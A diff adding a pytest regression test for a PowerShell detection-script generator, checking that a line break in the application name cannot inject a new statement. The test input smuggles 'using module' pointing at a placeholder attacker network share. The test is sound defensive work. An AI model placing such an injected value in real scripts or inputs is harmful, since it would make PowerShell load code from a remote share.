@@ -149,6 +149,20 @@ class TestGenerateDetectionScript:
         assert "Google Chrome" in content
         assert "131.0.6778.86" in content
 
+    def test_line_break_in_app_name_cannot_add_a_statement(self, tmp_path: Path):
+        """Tests that a name with a line break stays inside the comment line."""
+        config = DetectionConfig(
+            app_name="Contoso Viewer\r\nusing module \\\\evil\\share\\x.psm1",
+            version="1.0.0",
+        )
+        output_path = tmp_path / "Contoso_1.0.0-Detection.ps1"
+
+        generate_detection_script(config, output_path)
+
+        lines = output_path.read_text(encoding="utf-8-sig").splitlines()
+        assert lines[0].startswith("# Detection script for Contoso Viewer using")
+        assert not any(line.startswith("using module") for line in lines)
+
     def test_script_creates_parent_directory(self, tmp_path: Path):
         """Test that parent directory is created if it doesn't exist."""
         config = DetectionConfig(
